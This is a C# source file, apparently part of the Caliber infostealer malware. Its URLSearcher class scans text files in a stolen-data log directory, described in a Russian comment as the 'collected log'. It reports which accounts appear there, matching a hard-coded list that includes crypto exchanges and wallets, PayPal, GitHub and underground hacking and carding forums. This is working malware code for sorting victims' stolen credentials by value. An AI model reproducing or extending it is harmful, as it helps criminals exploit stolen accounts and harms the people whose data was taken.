using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;

namespace youknowcaliber
{
    class URLSearcher
    {
        public static string GetDomainDetect(string Browser)
        {
            try
            {
                string[] for_search = { "cryptonator.com", "payeer.com", "lolz.guru", "wwh-club.net", "xss.is", "bhf.io", "btc.com", "minergate.com", "blockchain.com", "github.com", "coinbase.com","paypal.com" };
                // Во всех подпапках сборанного лога в *.txt ищем нужные домены
                var di = new DirectoryInfo(Browser);
                var files = di.GetFiles("*.txt", SearchOption.TopDirectoryOnly);
                var lines_input = new List<string>();
                foreach (var fl in files)
                {
                    lines_input.AddRange(File.ReadAllLines(fl.FullName, Encoding.UTF8));
                }

                HashSet<string> all_words = new HashSet<string>();


                foreach (var line in lines_input)
                {
                    var from_line = line.Split().Select(w => w.Trim()).Where(w => w != "").Select(w => w.ToLower()).ToList();
                    foreach (var fl in from_line)
                    {
                        if (!all_words.Contains(fl))
                            all_words.Add(fl);
                    }
                }

                HashSet<string> found = new HashSet<string>();

                foreach (var fs in for_search)
                {
                    foreach (var h in all_words)
                    {
                        if (h.Contains(fs))
                        {
                            if (!found.Contains(fs))
                                found.Add(fs);
                        }
                    }
                }
                string result;
                return result = string.Join("\n - ", found);


            }
            catch(Exception e)
            {               
                
                return "";
            }
        }
    }
}
